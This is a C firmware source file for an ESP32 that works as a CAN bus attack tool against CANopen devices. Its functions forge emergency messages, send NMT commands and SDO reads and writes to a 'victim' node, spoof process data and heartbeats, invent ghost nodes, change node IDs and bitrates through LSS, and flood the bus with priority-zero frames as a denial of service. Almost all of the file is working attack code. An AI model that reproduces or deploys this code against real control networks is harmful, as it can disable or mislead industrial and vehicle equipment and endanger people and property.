#include "can_attack.h"
#include "config.h"

#include "driver/twai.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "CAN_ATTACK";

typedef enum {
    ATK_NONE = 0,
    ATK_EMCY_FLOOD,
    ATK_SDO_FLOOD,
    ATK_PDO_FLOOD,
    ATK_HB_SPOOF,
    ATK_HB_GHOST,
    ATK_DOS_FLOOD,
} attack_mode_t;

static TaskHandle_t      attack_task_handle = NULL;
static volatile bool     attack_active      = false;
static attack_mode_t     attack_mode        = ATK_NONE;
static uint32_t          attack_interval    = 100;
static uint8_t           attack_arg_state   = 0;
static uint8_t           attack_arg_node    = 0;

bool can_attack_is_active(void) { return attack_active; }

esp_err_t can_attack_init(void)
{
    twai_general_config_t g_config = TWAI_GENERAL_CONFIG_DEFAULT(
        CAN_TX_GPIO, CAN_RX_GPIO, TWAI_MODE_NORMAL);
    g_config.tx_queue_len = 40;
    g_config.rx_queue_len = 20;

    twai_timing_config_t t_config = TWAI_TIMING_CONFIG_500KBITS();
    twai_filter_config_t f_config = TWAI_FILTER_CONFIG_ACCEPT_ALL();

    esp_err_t err = twai_driver_install(&g_config, &t_config, &f_config);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "TWAI install failed: %s", esp_err_to_name(err));
        return err;
    }
    err = twai_start();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "TWAI start failed: %s", esp_err_to_name(err));
        return err;
    }
    ESP_LOGI(TAG, "TWAI started at %d kbps on TX=%d RX=%d",
             CAN_BITRATE_KBPS, CAN_TX_GPIO, CAN_RX_GPIO);
    return ESP_OK;
}

static esp_err_t tx(twai_message_t *msg, const char *what)
{
    esp_err_t err = twai_transmit(msg, pdMS_TO_TICKS(100));
    if (err == ESP_OK) {
        ESP_LOGW(TAG, "[ATTACK] %s COB-ID=0x%03lX dlc=%d",
                 what, (unsigned long)msg->identifier, msg->data_length_code);
    } else {
        ESP_LOGE(TAG, "%s transmit failed: %s", what, esp_err_to_name(err));
    }
    return err;
}

esp_err_t can_send_fake_emcy(uint16_t error_code, uint8_t error_register)
{
    twai_message_t msg = {0};
    msg.identifier = EMCY_COB_ID(VICTIM_NODE_ID);
    msg.data_length_code = 8;
    msg.data[0] = error_code & 0xFF;
    msg.data[1] = (error_code >> 8) & 0xFF;
    msg.data[2] = error_register;
    msg.data[3] = 0xDE;
    msg.data[4] = 0xAD;
    msg.data[5] = 0xBE;
    msg.data[6] = 0xEF;
    msg.data[7] = 0x00;
    return tx(&msg, "EMCY");
}

esp_err_t can_send_nmt(uint8_t command_specifier)
{
    twai_message_t msg = {0};
    msg.identifier = NMT_COB_ID;
    msg.data_length_code = 2;
    msg.data[0] = command_specifier;
    msg.data[1] = VICTIM_NODE_ID;
    return tx(&msg, "NMT");
}

esp_err_t can_sdo_read(uint16_t index, uint8_t subindex)
{
    twai_message_t msg = {0};
    msg.identifier = SDO_RX_COB_ID(VICTIM_NODE_ID);
    msg.data_length_code = 8;
    msg.data[0] = SDO_CCS_UPLOAD;
    msg.data[1] = index & 0xFF;
    msg.data[2] = (index >> 8) & 0xFF;
    msg.data[3] = subindex;
    return tx(&msg, "SDO_READ");
}

esp_err_t can_sdo_write_u16(uint16_t index, uint8_t subindex, uint16_t value)
{
    twai_message_t msg = {0};
    msg.identifier = SDO_RX_COB_ID(VICTIM_NODE_ID);
    msg.data_length_code = 8;
    msg.data[0] = SDO_CCS_DOWNLOAD_2B;
    msg.data[1] = index & 0xFF;
    msg.data[2] = (index >> 8) & 0xFF;
    msg.data[3] = subindex;
    msg.data[4] = value & 0xFF;
    msg.data[5] = (value >> 8) & 0xFF;
    msg.data[6] = 0x00;
    msg.data[7] = 0x00;
    return tx(&msg, "SDO_WRITE");
}

esp_err_t can_send_pdo_spoof(uint32_t cob_id, const uint8_t payload[8])
{
    twai_message_t msg = {0};
    msg.identifier = cob_id;
    msg.data_length_code = 8;
    memcpy(msg.data, payload, 8);
    return tx(&msg, "PDO_SPOOF");
}

esp_err_t can_send_heartbeat(uint8_t node_id, uint8_t state)
{
    twai_message_t msg = {0};
    msg.identifier = HEARTBEAT_COB_ID(node_id);
    msg.data_length_code = 1;
    msg.data[0] = state;
    return tx(&msg, "HEARTBEAT");
}

static esp_err_t lss_switch_global_config(void)
{
    twai_message_t msg = {0};
    msg.identifier = LSS_MASTER_COB_ID;
    msg.data_length_code = 8;
    msg.data[0] = 0x04;
    msg.data[1] = 0x01;
    return tx(&msg, "LSS_SWITCH");
}

esp_err_t can_lss_set_node_id(uint8_t new_node_id)
{
    esp_err_t err = lss_switch_global_config();
    if (err != ESP_OK) return err;
    vTaskDelay(pdMS_TO_TICKS(10));
    twai_message_t msg = {0};
    msg.identifier = LSS_MASTER_COB_ID;
    msg.data_length_code = 8;
    msg.data[0] = 0x11;
    msg.data[1] = new_node_id;
    return tx(&msg, "LSS_NODEID");
}

esp_err_t can_lss_set_bitrate(uint8_t table_index)
{
    esp_err_t err = lss_switch_global_config();
    if (err != ESP_OK) return err;
    vTaskDelay(pdMS_TO_TICKS(10));
    twai_message_t msg = {0};
    msg.identifier = LSS_MASTER_COB_ID;
    msg.data_length_code = 8;
    msg.data[0] = 0x13;
    msg.data[1] = 0x00;
    msg.data[2] = table_index;
    return tx(&msg, "LSS_BITRATE");
}

static void attack_task(void *arg)
{
    const uint16_t emcy_codes[] = {0x3210, 0x4210, 0x5530, 0x8130, 0x9000};
    const uint8_t  emcy_regs[]  = {0x04, 0x08, 0x01, 0x10, 0x80};
    size_t emcy_idx = 0;
    const size_t emcy_n = sizeof(emcy_codes) / sizeof(emcy_codes[0]);

    uint8_t pdo_payload[8] = {0xFF, 0xFF, 0x13, 0x37, 0xCA, 0xFE, 0x00, 0x00};
    uint16_t pdo_counter = 0;

    while (attack_active) {
        switch (attack_mode) {
        case ATK_EMCY_FLOOD:
            can_send_fake_emcy(emcy_codes[emcy_idx], emcy_regs[emcy_idx]);
            emcy_idx = (emcy_idx + 1) % emcy_n;
            vTaskDelay(pdMS_TO_TICKS(attack_interval));
            break;

        case ATK_SDO_FLOOD:
            can_sdo_read(OD_SENSOR_VALUE_INDEX, 0x00);
            vTaskDelay(pdMS_TO_TICKS(attack_interval));
            break;

        case ATK_PDO_FLOOD:
            pdo_payload[6] = pdo_counter & 0xFF;
            pdo_payload[7] = (pdo_counter >> 8) & 0xFF;
            pdo_counter++;
            can_send_pdo_spoof(TPDO1_COB_ID(VICTIM_NODE_ID), pdo_payload);
            vTaskDelay(pdMS_TO_TICKS(attack_interval));
            break;

        case ATK_HB_SPOOF:
            can_send_heartbeat(VICTIM_NODE_ID, attack_arg_state);
            vTaskDelay(pdMS_TO_TICKS(attack_interval));
            break;

        case ATK_HB_GHOST:
            can_send_heartbeat(attack_arg_node, 0x05);
            vTaskDelay(pdMS_TO_TICKS(attack_interval));
            break;

        case ATK_DOS_FLOOD: {
            twai_message_t msg = {0};
            msg.identifier = 0x000;
            msg.data_length_code = 0;
            twai_transmit(&msg, pdMS_TO_TICKS(10));
            if (attack_interval > 0) {
                esp_rom_delay_us(attack_interval);
            }
            break;
        }

        default:
            attack_active = false;
            break;
        }
    }

    attack_mode = ATK_NONE;
    attack_task_handle = NULL;
    vTaskDelete(NULL);
}

static void start_continuous(attack_mode_t mode, uint32_t interval)
{
    if (attack_active) {
        ESP_LOGW(TAG, "Attack already active, stop it first");
        return;
    }
    attack_mode     = mode;
    attack_interval = interval;
    attack_active   = true;
    uint32_t stack = (mode == ATK_DOS_FLOOD) ? 4096 : 4096;
    UBaseType_t prio = (mode == ATK_DOS_FLOOD) ? 10 : 5;
    xTaskCreate(attack_task, "atk_task", stack, NULL, prio, &attack_task_handle);
    ESP_LOGW(TAG, "[ATTACK] Started mode %d interval %lu",
             (int)mode, (unsigned long)interval);
}

void can_start_emcy_flood(uint32_t interval_ms) { start_continuous(ATK_EMCY_FLOOD, interval_ms); }
void can_start_sdo_flood(uint32_t interval_ms)  { start_continuous(ATK_SDO_FLOOD, interval_ms); }
void can_start_pdo_flood(uint32_t interval_ms)  { start_continuous(ATK_PDO_FLOOD, interval_ms); }

void can_start_hb_spoof(uint8_t state, uint32_t interval_ms)
{
    attack_arg_state = state;
    start_continuous(ATK_HB_SPOOF, interval_ms);
}

void can_start_hb_ghost(uint8_t node_id, uint32_t interval_ms)
{
    attack_arg_node = node_id;
    start_continuous(ATK_HB_GHOST, interval_ms);
}

void can_start_dos_flood(uint32_t interval_us) { start_continuous(ATK_DOS_FLOOD, interval_us); }

void can_stop_attack(void)
{
    if (attack_active) {
        attack_active = false;
        ESP_LOGI(TAG, "Attack stop requested");
    }
}
